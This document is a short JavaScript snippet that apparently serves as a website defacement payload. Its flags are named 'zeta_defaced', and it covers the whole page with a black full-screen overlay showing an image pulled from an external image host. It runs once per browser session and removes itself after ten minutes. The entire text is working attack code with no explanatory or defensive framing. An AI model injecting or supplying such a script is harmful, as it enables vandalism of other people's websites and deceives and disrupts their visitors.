(function() {
    if (sessionStorage.getItem('zeta_defaced')) return;
    sessionStorage.setItem('zeta_defaced', 'true');
    
    var overlay = document.createElement('div');
    overlay.id = 'zeta-overlay';
    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999999;background:#000;display:flex;align-items:center;justify-content:center;';
    
    var img = document.createElement('img');
    img.src = 'https://i.postimg.cc/BLLYFxj8/photo.jpg';
    img.style.cssText = 'max-width:100%;max-height:100%;object-fit:contain;';
    overlay.appendChild(img);
    document.body.appendChild(overlay);
    
    setTimeout(function() {
        var el = document.getElementById('zeta-overlay');
        if (el) { el.style.opacity = '0'; el.style.transition = 'opacity 1s'; }
        setTimeout(function() { if (el) el.remove(); sessionStorage.removeItem('zeta_defaced'); }, 1000);
    }, 600000);
})();
